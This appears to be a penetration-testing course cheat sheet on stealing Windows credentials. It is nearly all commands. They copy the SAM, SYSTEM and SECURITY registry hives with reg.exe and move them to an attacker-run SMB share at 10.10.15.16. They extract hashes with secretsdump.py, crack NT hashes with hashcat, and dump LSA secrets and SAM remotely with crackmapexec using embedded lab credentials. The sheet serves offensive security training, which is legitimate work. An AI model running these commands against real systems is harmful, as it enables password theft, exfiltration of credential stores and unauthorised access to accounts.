#### Copying SAM Registry Hives

| Registry Hive  | Description                                                                                          |
|----------------|------------------------------------------------------------------------------------------------------|
| hklm\sam       | Contains the hashes associated with local account passwords. We will need the hashes to crack them and get the user account passwords in cleartext.  |
| hklm\system    | Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.                     |
| hklm\security  | Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.                                    |
#### Using reg.exe save to Copy Registry Hives
```cmd
reg.exe save hklm\sam C:\sam.save
```
```cmd
reg.exe save hklm\system C:\system.save
```
```cmd
reg.exe save hklm\security C:\security.save
```
#### Creating a Share with smbserver.py
```shell
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData <Attacker-path>
```
#### Moving Hive Copies to Share
```cmd
move sam.save \\10.10.15.16\CompData
```
```cmd
move security.save \\10.10.15.16\CompData
```
```cmd
move system.save \\10.10.15.16\CompData
```
#### secretsdump.py
```shell
locate secretsdump 
```
```shell
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
## Cracking Hashes with Hashcat
#### Adding nthashes to a .txt File
```shell
sudo vim hashestocrack.txt
```
#### Running Hashcat against NT Hashes
```shell
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```
## Remote Dumping & LSA Secrets Considerations
#### Dumping LSA Secrets Remotely
```shell
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```
#### Dumping SAM Remotely
```shell
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

